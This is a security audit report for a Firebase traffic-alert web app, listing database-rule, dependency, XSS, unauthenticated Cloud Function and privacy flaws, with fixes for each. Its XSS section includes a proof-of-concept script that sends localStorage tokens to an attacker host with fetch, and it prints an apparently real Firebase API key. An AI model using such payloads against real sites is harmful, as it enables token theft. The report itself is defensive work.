# TraficDay Security Audit Report

**Date:** 2025-10-06
**Audited by:** Claude Code Security Analysis
**Application:** TraficDay v3.0.0
**Owner:** The Day Info

---

## Executive Summary

This comprehensive security audit identifies vulnerabilities, security risks, and provides actionable recommendations for the TraficDay application. The audit covers Firebase configuration, database security, authentication, XSS vulnerabilities, input validation, Cloud Functions, and dependency management.

### Overall Risk Level: **MEDIUM-HIGH** ⚠️

---

## 1. Critical Vulnerabilities 🔴

### 1.1 Exposed Firebase API Keys

**Severity:** HIGH
**Location:** `public/firebase-config.js:30-37`

**Issue:**
```javascript
const firebaseConfig = {
    apiKey: "AIzaSyDSsuLhD9vZ_jiMlPJT5IwmOc_cI5b3n7k",
    authDomain: "traficday-91045.firebaseapp.com",
    // ... other sensitive config
};
```

**Risk:**
- Firebase API keys are publicly exposed in client-side code
- Anyone can inspect the source code and extract these credentials
- While Firebase API keys are meant to be public, they should be protected with proper security rules

**Status:** ⚠️ **ACCEPTABLE BUT RISKY**

**Explanation:**
Firebase client API keys are designed to be public and are restricted by:
- Firebase Security Rules (database.rules.json)
- Firebase Auth domain restrictions
- However, VAPID key for FCM is also exposed

**Recommendations:**
1. ✅ Keep firebase-config.js in .gitignore (already done)
2. ✅ Ensure Firebase Security Rules are properly configured
3. 🔧 Use environment variables for sensitive keys in production
4. 🔧 Consider using Firebase App Check for additional security
5. 🔧 Implement rate limiting on Firebase console

---

### 1.2 Database Security Rules - Overly Permissive Read Access

**Severity:** HIGH
**Location:** `database.rules.json:3`

**Issue:**
```json
{
  "rules": {
    ".read": true,  // ❌ Anyone can read ALL data
    ".write": "auth != null",
    ...
  }
}
```

**Risk:**
- **Anyone** (even unauthenticated users) can read the entire database
- User personal data is exposed (emails, locations, FCM tokens)
- Obstacles data is public (acceptable for app functionality)
- Privacy violation for user profiles

**Impact:**
- User email addresses can be scraped
- User locations can be tracked
- FCM tokens can be extracted
- GDPR/Privacy policy violations

**Recommendations:**
```json
{
  "rules": {
    ".read": false,  // Default deny
    ".write": false, // Default deny

    "obstacles": {
      ".read": true,  // Public read for map functionality
      ".write": "auth != null",
      ".indexOn": ["timestamp", "active"],
      "$obstacleId": {
        ".validate": "newData.hasChildren(['type', 'lat', 'lng', 'timestamp', 'userId'])",
        "type": {
          ".validate": "newData.isString() && newData.val().matches(/^(flood|protest|closure|traffic|police)$/)"
        },
        "lat": {
          ".validate": "newData.isNumber() && newData.val() >= -90 && newData.val() <= 90"
        },
        "lng": {
          ".validate": "newData.isNumber() && newData.val() >= -180 && newData.val() <= 180"
        },
        "active": {
          ".validate": "newData.isBoolean()"
        }
      }
    },

    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",  // Users can only read their own data
        ".write": "$uid === auth.uid",
        ".validate": "newData.hasChildren(['email', 'displayName', 'lastLogin'])",
        "notificationToken": {
          ".validate": "newData.isString()"
        },
        "location": {
          ".validate": "newData.hasChildren(['lat', 'lng'])"
        }
      }
    },

    "notifications": {
      ".read": "auth != null",
      ".write": "auth != null"
    }
  }
}
```

**Action Required:** 🚨 **IMMEDIATE**

---

### 1.3 NPM Dependency Vulnerabilities

**Severity:** CRITICAL
**Location:** `functions/node_modules`

**Issue:**
```
protobufjs 7.0.0 - 7.2.4
Severity: critical
Prototype Pollution vulnerability
CVE: GHSA-h755-8qp9-cq85
```

**Affected Packages:**
- `protobufjs` (critical)
- `google-gax` (depends on protobufjs)
- `@google-cloud/firestore` (depends on google-gax)
- `firebase-admin` 11.8.0 (depends on @google-cloud/firestore)

**Risk:**
- Prototype pollution can lead to:
  - Remote code execution
  - Denial of service
  - Security bypass
  - Data manipulation

**Recommendations:**
```bash
# Update to latest firebase-admin (breaking change)
cd functions
npm install firebase-admin@latest

# Or run audit fix
npm audit fix --force
```

**Action Required:** 🚨 **IMMEDIATE**

---

## 2. High-Risk Vulnerabilities 🟠

### 2.1 XSS (Cross-Site Scripting) Vulnerability

**Severity:** HIGH
**Location:** `public/app.js:858-870`

**Issue:**
```javascript
listView.innerHTML = app.obstacles.map(obs => `
    <div class="alert-card" onclick="showObstacleDetails({id: '${obs.id}'})">
        <p class="alert-description">${obs.description}</p>  // ❌ Unescaped user input
        <span>📍 ${obs.zone || 'Zone inconnue'}</span>        // ❌ Unescaped user input
    </div>
`).join('');
```

**Risk:**
- User-submitted descriptions can contain malicious JavaScript
- Example attack: `<img src=x onerror="alert('XSS')">`
- Can steal user tokens, session data, or perform actions on behalf of users

**Proof of Concept:**
```javascript
// Attacker creates obstacle with malicious description:
description: "<script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>"
```

**Recommendations:**

**Option 1: Use textContent instead of innerHTML**
```javascript
function createObstacleCard(obs) {
    const card = document.createElement('div');
    card.className = 'alert-card';

    const desc = document.createElement('p');
    desc.className = 'alert-description';
    desc.textContent = obs.description; // ✅ Safe

    card.appendChild(desc);
    return card;
}
```

**Option 2: Implement HTML escaping function**
```javascript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

listView.innerHTML = app.obstacles.map(obs => `
    <p class="alert-description">${escapeHtml(obs.description)}</p>
`).join('');
```

**Action Required:** 🚨 **HIGH PRIORITY**

---

### 2.2 No Input Validation on Client Side

**Severity:** MEDIUM-HIGH
**Location:** `public/app.js:320-350`

**Issue:**
```javascript
async function reportObstacle(type) {
    // No validation on description length
    // No sanitization of input
    // No rate limiting

    const newObstacle = {
        type,
        lat: app.userLocation.latitude,
        lng: app.userLocation.longitude,
        description: getObstacleLabel(type),  // Static label - GOOD
        timestamp: Date.now(),
        reports: 1,
        active: true,
        userId: app.user.uid,
        confirmedBy: [app.user.uid]
    };
}
```

**Risk:**
- While description uses static label (good!), if user input is added later, it's vulnerable
- No rate limiting on obstacle creation
- Users can spam obstacles
- Coordinates are not validated (could be outside valid range)

**Recommendations:**
```javascript
function validateCoordinates(lat, lng) {
    return (
        typeof lat === 'number' &&
        typeof lng === 'number' &&
        lat >= -90 && lat <= 90 &&
        lng >= -180 && lng <= 180
    );
}

function validateObstacleType(type) {
    const validTypes = ['flood', 'protest', 'closure', 'traffic', 'police'];
    return validTypes.includes(type);
}

async function reportObstacle(type) {
    // Validate type
    if (!validateObstacleType(type)) {
        throw new Error('Invalid obstacle type');
    }

    // Validate coordinates
    if (!validateCoordinates(app.userLocation.latitude, app.userLocation.longitude)) {
        throw new Error('Invalid coordinates');
    }

    // Rate limiting (client-side)
    const lastReport = localStorage.getItem('lastReportTime');
    const now = Date.now();
    if (lastReport && (now - parseInt(lastReport)) < 60000) { // 1 minute
        alert('⚠️ Veuillez attendre avant de signaler un autre obstacle');
        return;
    }
    localStorage.setItem('lastReportTime', now.toString());

    // ... continue with obstacle creation
}
```

**Action Required:** 🔧 **MEDIUM PRIORITY**

---

### 2.3 Cloud Function - Unauthenticated Manual Notifications

**Severity:** HIGH
**Location:** `functions/index.js:129-134`

**Issue:**
```javascript
exports.sendManualNotification = functions.https.onCall(async (data, context) => {
    // Vérifier que l'utilisateur est authentifié (optionnel)
    // if (!context.auth) {  // ❌ COMMENTED OUT!
    //     throw new functions.https.HttpsError('unauthenticated', 'Authentification requise');
    // }
```

**Risk:**
- **Anyone** can call this function and send notifications to all users
- Potential for spam, phishing, or malicious notifications
- No admin role verification
- Can be abused to exhaust FCM quota

**Proof of Concept:**
```javascript
// Any user can call this from console:
const sendManualNotification = firebase.functions().httpsCallable('sendManualNotification');
sendManualNotification({
    title: 'URGENT: Click here to win!',
    body: 'Visit evil.com for prize',
    topic: 'all'
});
```

**Recommendations:**
```javascript
exports.sendManualNotification = functions.https.onCall(async (data, context) => {
    // 1. Check authentication
    if (!context.auth) {
        throw new functions.https.HttpsError('unauthenticated', 'Authentification requise');
    }

    // 2. Check admin role (set custom claims in Firebase Auth)
    const adminUids = ['ADMIN_UID_1', 'ADMIN_UID_2']; // Or use custom claims
    if (!adminUids.includes(context.auth.uid)) {
        throw new functions.https.HttpsError('permission-denied', 'Admin access required');
    }

    // 3. Validate input
    const { title, body, topic } = data;
    if (!title || !body || title.length > 100 || body.length > 500) {
        throw new functions.https.HttpsError('invalid-argument', 'Invalid notification data');
    }

    // 4. Rate limiting
    const rateLimitRef = admin.database().ref(`adminRateLimit/${context.auth.uid}`);
    const snapshot = await rateLimitRef.once('value');
    const lastSent = snapshot.val();
    if (lastSent && (Date.now() - lastSent) < 60000) {
        throw new functions.https.HttpsError('resource-exhausted', 'Rate limit exceeded');
    }
    await rateLimitRef.set(Date.now());

    // ... continue with sending notification
});
```

**Action Required:** 🚨 **IMMEDIATE**

---

## 3. Medium-Risk Issues 🟡

### 3.1 Location Data Privacy

**Severity:** MEDIUM
**Location:** `public/firebase-config.js`, `database.rules.json`

**Issue:**
- User locations are stored permanently in database
- No automatic cleanup of old location data
- Location accuracy not reduced (privacy risk)

**Recommendations:**
1. Round coordinates to ~100m accuracy: `lat: Math.round(lat * 1000) / 1000`
2. Set TTL on location data (auto-delete after 24 hours)
3. Don't store full movement history
4. Allow users to disable location tracking

```javascript
export async function saveUserLocation(userId, lat, lng) {
    // Round to ~111m precision for privacy
    const roundedLat = Math.round(lat * 1000) / 1000;
    const roundedLng = Math.round(lng * 1000) / 1000;

    const locationRef = ref(database, `users/${userId}/location`);
    await set(locationRef, {
        lat: roundedLat,
        lng: roundedLng,
        timestamp: Date.now(),
        // Auto-expire after 24h
        expiresAt: Date.now() + (24 * 60 * 60 * 1000)
    });
}
```

---

### 3.2 No HTTPS Enforcement Headers

**Severity:** MEDIUM
**Location:** `firebase.json`

**Issue:**
- Missing security headers in Firebase Hosting configuration
- No Content Security Policy (CSP)
- No X-Frame-Options
- No X-Content-Type-Options

**Recommendations:**
```json
{
  "hosting": {
    "public": "public",
    "headers": [
      {
        "source": "**",
        "headers": [
          {
            "key": "Content-Security-Policy",
            "value": "default-src 'self'; script-src 'self' https://www.gstatic.com https://unpkg.com 'unsafe-inline'; style-src 'self' https://unpkg.com 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com"
          },
          {
            "key": "X-Frame-Options",
            "value": "SAMEORIGIN"
          },
          {
            "key": "X-Content-Type-Options",
            "value": "nosniff"
          },
          {
            "key": "Referrer-Policy",
            "value": "strict-origin-when-cross-origin"
          },
          {
            "key": "Permissions-Policy",
            "value": "geolocation=(self), notifications=(self)"
          }
        ]
      }
    ]
  }
}
```

---

### 3.3 No Rate Limiting on Obstacle Confirmations

**Severity:** MEDIUM
**Location:** `public/firebase-config.js:133-173`

**Issue:**
- Users can rapidly confirm/unconfirm obstacles
- No cooldown period
- Can artificially inflate confirmation counts

**Recommendations:**
```javascript
export async function confirmObstacle(obstacleId) {
    const user = auth.currentUser;
    if (!user) throw new Error('Utilisateur non connecté');

    // Check rate limit
    const rateLimitRef = ref(database, `userRateLimits/${user.uid}/lastConfirm`);
    const snapshot = await get(rateLimitRef);
    const lastConfirm = snapshot.val();

    if (lastConfirm && (Date.now() - lastConfirm) < 30000) { // 30 seconds
        return { success: false, error: 'Veuillez attendre avant de confirmer un autre obstacle' };
    }

    // Update rate limit
    await set(rateLimitRef, Date.now());

    // ... continue with confirmation
}
```

---

### 3.4 FCM Token Management

**Severity:** MEDIUM
**Location:** `functions/index.js:108-119`

**Issue:**
```javascript
// TODO: Implémenter la suppression des tokens invalides
```

**Risk:**
- Invalid FCM tokens accumulate in database
- Wasted storage and processing
- Failed notification attempts

**Recommendations:**
```javascript
// In Cloud Function after sending notifications
if (response.failureCount > 0) {
    const cleanupPromises = [];

    response.responses.forEach((resp, idx) => {
        if (!resp.success) {
            const errorCode = resp.error?.code;

            // Remove invalid tokens
            if (errorCode === 'messaging/invalid-registration-token' ||
                errorCode === 'messaging/registration-token-not-registered') {

                const token = tokens[idx];

                // Find and remove token from user's profile
                const userQuery = admin.database()
                    .ref('users')
                    .orderByChild('fcmToken')
                    .equalTo(token);

                cleanupPromises.push(
                    userQuery.once('value').then(snapshot => {
                        snapshot.forEach(child => {
                            child.ref.child('fcmToken').remove();
                        });
                    })
                );
            }
        }
    });

    await Promise.all(cleanupPromises);
    console.log(`🧹 ${cleanupPromises.length} invalid tokens cleaned up`);
}
```

---

## 4. Low-Risk Issues / Best Practices 🟢

### 4.1 Console Logs in Production

**Severity:** LOW
**Location:** Multiple files

**Issue:**
- Extensive `console.log()` statements in production code
- Can leak sensitive information
- Performance impact

**Recommendations:**
```javascript
// Create a logger utility
const DEBUG = false; // Set to false in production

const logger = {
    log: (...args) => DEBUG && console.log(...args),
    error: (...args) => console.error(...args),
    warn: (...args) => DEBUG && console.warn(...args)
};

// Use throughout app
logger.log('🔥 Firebase configuré avec succès');
```

---

### 4.2 No Error Boundaries

**Severity:** LOW
**Location:** `public/app.js`

**Issue:**
- No global error handling
- Uncaught errors can crash the app

**Recommendations:**
```javascript
// Add global error handler
window.addEventListener('error', (event) => {
    console.error('❌ Erreur globale:', event.error);
    // Log to error tracking service (Sentry, etc.)
    alert('Une erreur est survenue. Veuillez rafraîchir la page.');
});

window.addEventListener('unhandledrejection', (event) => {
    console.error('❌ Promesse rejetée non gérée:', event.reason);
});
```

---

### 4.3 Service Worker Security

**Severity:** LOW
**Location:** `public/sw.js`

**Issue:**
- Service Worker caches external resources from CDNs
- Could serve stale/compromised versions

**Recommendations:**
- Use Subresource Integrity (SRI) for CDN resources
- Implement cache versioning
- Add cache expiration strategy

```html
<!-- In index.html -->
<script
    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
    integrity="sha384-..."
    crossorigin="anonymous">
</script>
```

---

## 5. Compliance & Privacy 📋

### 5.1 GDPR Compliance

**Status:** ⚠️ PARTIALLY COMPLIANT

**Issues:**
- ✅ Privacy policy exists (PRIVACY.md)
- ✅ User consent for location tracking
- ❌ No explicit consent banner for cookies/tracking
- ❌ No data export functionality
- ❌ No account deletion functionality
- ⚠️ User data (emails, locations) publicly readable

**Recommendations:**
1. Implement cookie consent banner
2. Add "Export my data" feature
3. Add "Delete my account" feature
4. Fix database rules to protect user data
5. Add data retention policies

---

### 5.2 User Data Protection

**Personal Data Collected:**
- Email address
- Display name
- Profile photo
- Real-time location
- FCM tokens
- Obstacle reports

**Current Protection:** ❌ INSUFFICIENT
- All user data readable by anyone (`.read: true`)
- No encryption at rest (Firebase default)
- No data minimization

**Required Actions:**
1. Fix database rules (Section 1.2)
2. Implement data anonymization for public obstacles
3. Add data retention limits
4. Provide user data download/deletion

---

## 6. Recommendations Summary

### Immediate Actions (Next 24-48 Hours) 🚨

1. **Fix Database Security Rules** (Section 1.2)
   - Restrict user data access
   - Add validation rules
   - Deploy new rules immediately

2. **Update Dependencies** (Section 1.3)
   ```bash
   cd functions
   npm install firebase-admin@latest
   npm audit fix
   ```

3. **Fix XSS Vulnerability** (Section 2.1)
   - Implement HTML escaping
   - Use textContent instead of innerHTML

4. **Secure Manual Notifications** (Section 2.3)
   - Add authentication check
   - Implement admin role verification

### High Priority (Next Week) 🔧

5. **Implement Input Validation** (Section 2.2)
6. **Add Rate Limiting** (Section 3.3)
7. **Fix FCM Token Cleanup** (Section 3.4)
8. **Add Security Headers** (Section 3.2)
9. **Improve Location Privacy** (Section 3.1)

### Medium Priority (Next Month) ⚙️

10. **Add GDPR Features** (Section 5.1)
11. **Implement Error Boundaries** (Section 4.2)
12. **Add Production Logging** (Section 4.1)
13. **Implement SRI** (Section 4.3)

---

## 7. Security Checklist

### Before Production Launch

- [ ] Database rules updated and tested
- [ ] Dependencies updated (no critical vulnerabilities)
- [ ] XSS vulnerabilities fixed
- [ ] Authentication implemented on Cloud Functions
- [ ] Rate limiting implemented
- [ ] Security headers configured
- [ ] Location data rounded for privacy
- [ ] FCM token cleanup implemented
- [ ] GDPR consent banner added
- [ ] Data export/deletion features added
- [ ] Error logging configured
- [ ] Security testing performed
- [ ] Penetration testing completed (recommended)

---

## 8. Testing Recommendations

### Security Testing

1. **Penetration Testing**
   - Test XSS vulnerabilities
   - Test authentication bypass
   - Test rate limiting
   - Test database access controls

2. **Automated Security Scanning**
   ```bash
   # Install OWASP ZAP or similar tools
   npm install -g snyk
   snyk test
   ```

3. **Manual Testing**
   - Attempt to read other users' data
   - Test malicious input injection
   - Test unauthorized Cloud Function calls
   - Verify HTTPS enforcement

---

## 9. Ongoing Security

### Monthly Tasks
- Review Firebase Security Rules
- Check for new npm vulnerabilities
- Review access logs for suspicious activity
- Update dependencies

### Quarterly Tasks
- Full security audit
- Penetration testing
- Review GDPR compliance
- Update privacy policy

### Monitoring
- Set up Firebase Performance Monitoring
- Enable Firebase Crashlytics
- Monitor Cloud Functions logs
- Track failed authentication attempts

---

## 10. Contact & Resources

### Report Security Issues
**Email:** security@thedayinfo.com
**PGP Key:** [To be added]

### Resources
- [Firebase Security Rules Documentation](https://firebase.google.com/docs/database/security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
- [GDPR Compliance Checklist](https://gdpr.eu/checklist/)

---

## Conclusion

TraficDay has a solid foundation but requires immediate security improvements before production deployment. The most critical issues are:

1. **Database security rules** exposing user data
2. **XSS vulnerabilities** in user-generated content
3. **Critical npm dependencies** with known vulnerabilities
4. **Unauthenticated Cloud Functions** allowing abuse

With the recommended fixes implemented, TraficDay can be securely deployed and provide a safe experience for users.

---

**Report Generated:** 2025-10-06
**Next Audit Recommended:** 2025-11-06

© 2025 The Day Info - Security Audit
